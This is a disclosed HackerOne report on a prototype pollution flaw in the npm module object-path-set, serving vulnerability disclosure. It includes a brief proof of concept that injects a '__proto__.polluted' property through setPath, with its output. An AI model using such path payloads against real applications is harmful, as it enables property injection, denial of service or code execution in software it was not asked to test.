---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '878332'
original_report_id: '878332'
title: '[object-path-set] Prototype pollution'
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: nodejs-ecosystem
created_at: '2020-05-19T19:17:47.109Z'
disclosed_at: '2020-08-20T09:08:31.858Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 0
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# [object-path-set] Prototype pollution

## Metadata

- HackerOne Report ID: 878332
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: nodejs-ecosystem
- Disclosed At: 2020-08-20T09:08:31.858Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `prototype pollution` vulnerability in `object-path-set` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `object-path-set`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/object-path-set`

## Module Description

set values in javascript objects by specifying a path.
if the path doesn't exist yet, it will be created.

## Module Stats

[81] weekly downloads

# Vulnerability

## Vulnerability Description

The `setPath` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `object-path-set` module:
    - `npm i object-path-set`

Set the `__proto__.polluted` property of an object:
```javascript

const setPath = require('object-path-set');
const obj = {};
console.log("Before : " + obj.polluted);
setPath({}, '__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835049}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
